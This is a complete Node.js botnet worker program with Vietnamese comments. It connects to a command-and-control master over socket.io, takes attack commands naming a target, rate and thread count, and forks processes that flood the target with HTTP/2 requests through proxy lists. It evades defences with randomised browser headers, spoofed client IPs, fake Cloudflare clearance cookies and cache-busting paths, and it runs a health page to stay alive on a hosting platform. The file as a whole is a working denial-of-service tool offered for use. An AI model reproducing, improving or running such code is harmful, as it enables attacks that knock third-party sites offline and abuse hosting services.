
process.on('uncaughtException', (err) => {
    console.error('[!] Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (err) => {
    console.error('[!] Unhandled Rejection:', err.message);
});

const io = require('socket.io-client');
const cluster = require('cluster');
const crypto = require('crypto');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const os = require('os');
const express = require('express');

// ==================== CONFIG ====================
const MASTER_DOMAIN = process.argv[2];
const MASTER_PORT = 443; // Cổng HTTPS mặc định
const HEALTH_PORT = process.env.PORT || 10000; // Render yêu cầu mở cổng này

if (!MASTER_DOMAIN) {
    console.error('[!] Usage: node worker.js <master_domain>');
    console.error('[!] Example: node worker.js control-13.onrender.com');
    process.exit(1);
}

// ==================== LẤY IP THẬT CỦA WORKER ====================
function getLocalIP() {
    try {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
    } catch (e) {}
    return 'unknown';
}

// ==================== TẢI PROXY ====================
let proxies = ['direct'];
try {
    // Thử đọc file proxy.txt trước
    if (fs.existsSync('./proxy.txt')) {
        proxies = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .filter(line => line.trim() && line.includes(':'));
        console.log(`[+] Loaded ${proxies.length} proxies from file`);
    } else {
        // Nếu không có, tạo proxy mẫu
        console.log('[!] No proxy.txt found, using direct connection only');
    }
} catch (e) {
    console.log('[!] Error loading proxies, using direct connection');
}

// ==================== HEALTH SERVER - GIỮ WORKER SỐNG TRÊN RENDER ====================
const healthApp = express();

healthApp.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🤖 BOTNET WORKER</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
                .status { color: #00ff00; }
                .label { color: #888; }
            </style>
            <meta http-equiv="refresh" content="10">
        </head>
        <body>
            <div class="container">
                <h1>🤖 BOTNET WORKER</h1>
                <div class="card">
                    <h2>Worker Status</h2>
                    <p><span class="label">IP:</span> <span class="status">${getLocalIP()}</span></p>
                    <p><span class="label">Master:</span> <span class="status">${MASTER_DOMAIN}</span></p>
                    <p><span class="label">Connection:</span> <span class="status">${socket && socket.connected ? '✅ CONNECTED' : '❌ DISCONNECTED'}</span></p>
                    <p><span class="label">Proxies:</span> <span class="status">${proxies.length}</span></p>
                    <p><span class="label">Uptime:</span> <span class="status">${Math.floor(process.uptime())}s</span></p>
                </div>
                <div class="card">
                    <h2>System Info</h2>
                    <p><span class="label">Platform:</span> ${os.platform()}</p>
                    <p><span class="label">CPU:</span> ${os.cpus().length} cores</p>
                    <p><span class="label">Memory:</span> ${Math.round(os.freemem() / 1024 / 1024)}MB / ${Math.round(os.totalmem() / 1024 / 1024)}MB</p>
                    <p><span class="label">Node.js:</span> ${process.version}</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

healthApp.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        ip: getLocalIP(),
        master: MASTER_DOMAIN,
        connected: socket ? socket.connected : false,
        proxies: proxies.length,
        uptime: process.uptime(),
        memory: process.memoryUsage()
    });
});

healthApp.get('/stats', (req, res) => {
    res.json({
        connected: socket ? socket.connected : false,
        master: MASTER_DOMAIN,
        proxies: proxies.length,
        localIP: getLocalIP()
    });
});

// ==================== TLS CONFIG ====================
const ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
].join(':');

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: 'TLSv1.2'
});

// ==================== RANDOM HELPERS ====================
function randomElement(arr) { 
    return arr[Math.floor(Math.random() * arr.length)]; 
}

function randomString(len) { 
    return crypto.randomBytes(len).toString('hex').slice(0, len); 
}

function randomIP() { 
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; 
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ==================== USER-AGENTS ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36'
];

// ==================== HEADER LISTS ====================
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    '*/*',
    'application/json, text/plain, */*',
    'text/css,*/*;q=0.1'
];

const encodingHeaders = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate'
];

const langHeaders = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8'
];

const cacheHeaders = [
    'no-cache',
    'max-age=0',
    'no-store',
    'private, no-cache, no-store, must-revalidate'
];

const referers = [
    'https://www.google.com/',
    'https://www.google.com/search?q=',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.bing.com/',
    'https://www.instagram.com/'
];

const platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS'];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        
        const connection = net.connect(options.port, options.host, () => {
            connection.write(buffer);
        });

        connection.setTimeout(5000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        connection.on('data', (chunk) => {
            const response = chunk.toString();
            if (response.includes('HTTP/1.1 200')) {
                callback(connection);
            } else {
                connection.destroy();
                callback(null);
            }
        });

        connection.on('timeout', () => {
            connection.destroy();
            callback(null);
        });

        connection.on('error', () => {
            connection.destroy();
            callback(null);
        });
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate) {
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let requestCount = 0;
    let isRunning = true;
    
    // Gửi stats mỗi giây
    const statsInterval = setInterval(() => {
        if (requestCount > 0 && isRunning && socket.connected) {
            socket.emit('stats', { count: requestCount });
            requestCount = 0;
        }
    }, 1000);
    
    async function flood() {
        if (!isRunning) return;
        
        const proxy = randomElement(proxies);
        if (proxy === 'direct') {
            setTimeout(flood, 50);
            return;
        }
        
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort) {
            setTimeout(flood, 50);
            return;
        }
        
        // Tạo headers đa dạng
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + (parsed.path.includes('?') ? '&' : '?') + randomString(randomInt(4, 12)) + '=' + randomString(randomInt(2, 6)),
            ':authority': parsed.host,
            'user-agent': randomElement(uap),
            'accept': randomElement(acceptHeaders),
            'accept-encoding': randomElement(encodingHeaders),
            'accept-language': randomElement(langHeaders),
            'cache-control': randomElement(cacheHeaders),
            'referer': randomElement(referers),
            'x-forwarded-for': randomIP(),
            'x-real-ip': randomIP(),
            'cookie': `cf_clearance=${randomString(40)}; session=${randomString(16)}; _ga=${randomString(20)}`,
            'sec-ch-ua': `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': `"${randomElement(platforms)}"`,
            'dnt': randomElement(['1', '0'])
        };

        Socker.HTTP({
            host: proxyHost,
            port: parseInt(proxyPort),
            address: parsed.host + ':443'
        }, (connection) => {
            if (!connection || !isRunning) return;

            const tlsConn = tls.connect({
                socket: connection,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });

            const client = http2.connect(parsed.href, {
                createConnection: () => tlsConn,
                settings: {
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456
                }
            });

            client.on('connect', () => {
                // Gửi batch request
                for (let i = 0; i < rate; i++) {
                    if (!isRunning) break;
                    try {
                        const req = client.request(headers);
                        req.on('error', () => {});
                        req.end();
                        requestCount++;
                    } catch (e) {}
                }
                
                // Đóng kết nối sau khi gửi
                setTimeout(() => {
                    try { client.close(); } catch (e) {}
                    try { connection.destroy(); } catch (e) {}
                }, 100);
            });

            client.on('error', () => {
                try { client.destroy(); } catch (e) {}
                try { connection.destroy(); } catch (e) {}
            });
        });
        
        // Tiếp tục vòng lặp
        setImmediate(flood);
    }
    
    flood();
    
    // Trả về hàm dọn dẹp
    return () => {
        isRunning = false;
        clearInterval(statsInterval);
    };
}

// ==================== KẾT NỐI TỚI MASTER ====================
const masterUrl = `https://${MASTER_DOMAIN}`;
console.log(`[+] Connecting to master at ${masterUrl}`);

const socket = io(masterUrl, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    timeout: 20000,
    transports: ['websocket', 'polling'],
    forceNew: true
});

// Xử lý kết nối
socket.on('connect', () => {
    console.log(`[+] Connected to master at ${MASTER_DOMAIN}:443`);
    
    // Đăng ký worker với master
    socket.emit('register', { 
        ip: getLocalIP(),
        proxies: proxies.length,
        platform: os.platform(),
        cpus: os.cpus().length
    });
    
    // Gửi heartbeat mỗi 10 giây
    setInterval(() => {
        if (socket.connected) {
            socket.emit('ping');
        }
    }, 10000);
});

// Nhận pong từ master
socket.on('pong', () => {
    // Master còn sống
});

// Nhận lệnh tấn công
socket.on('attack', (data) => {
    console.log(`\n[+] ATTACK COMMAND RECEIVED`);
    console.log(`   Target: ${data.target}`);
    console.log(`   Time: ${data.time}s`);
    console.log(`   Rate: ${data.rate}`);
    console.log(`   Threads: ${data.threads}`);
    
    // Fork workers theo số threads yêu cầu
    if (cluster.isMaster) {
        console.log(`[+] Forking ${data.threads} workers...`);
        
        for (let i = 0; i < data.threads; i++) {
            cluster.fork();
        }
        
        // Tự động thoát sau thời gian
        setTimeout(() => {
            console.log(`[+] Attack time finished, exiting workers...`);
            process.exit(0);
        }, data.time * 1000);
        
    } else {
        // Worker process thực hiện flood
        const cleanup = createWorker(data.target, data.rate);
        
        // Lưu cleanup function để dùng khi nhận lệnh stop
        process.on('message', (msg) => {
            if (msg === 'stop') {
                cleanup();
                process.exit(0);
            }
        });
    }
});

// Nhận lệnh dừng
socket.on('stop', () => {
    console.log(`[+] STOP command received`);
    
    if (cluster.isMaster) {
        // Gửi lệnh stop cho tất cả worker
        for (const id in cluster.workers) {
            cluster.workers[id].send('stop');
        }
        
        setTimeout(() => {
            process.exit(0);
        }, 1000);
    }
});

// Xác nhận đăng ký thành công
socket.on('registered', (data) => {
    console.log(`[+] Registered with master. Total workers: ${data.workers}`);
});

// Mất kết nối
socket.on('disconnect', (reason) => {
    console.log(`[-] Disconnected from master: ${reason}`);
});

// Lỗi kết nối
socket.on('connect_error', (err) => {
    console.log(`[-] Connection error: ${err.message}`);
    console.log(`[!] Make sure master is running at ${masterUrl}`);
});

// Tự động reconnect khi mất kết nối
socket.io.on("reconnect", (attempt) => {
    console.log(`[+] Reconnected after ${attempt} attempts`);
});

socket.io.on("reconnect_attempt", (attempt) => {
    console.log(`[.] Reconnection attempt ${attempt}...`);
});

socket.io.on("reconnect_error", (err) => {
    console.log(`[-] Reconnection error: ${err.message}`);
});

socket.io.on("reconnect_failed", () => {
    console.log(`[-] Reconnection failed, restarting...`);
    process.exit(1);
});

// ==================== KHỞI ĐỘNG HEALTH SERVER ====================
healthApp.listen(HEALTH_PORT, '0.0.0.0', () => {
    console.log(`[+] Health server running on port ${HEALTH_PORT}`);
    console.log(`[+] Worker IP: ${getLocalIP()}`);
    console.log(`[+] Connected to master: ${MASTER_DOMAIN}`);
    console.log(`[+] Proxies loaded: ${proxies.length}`);
    console.log(`[+] Waiting for attack commands...`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[!] Received SIGTERM, shutting down...');
    if (socket) socket.disconnect();
    process.exit(0);
});
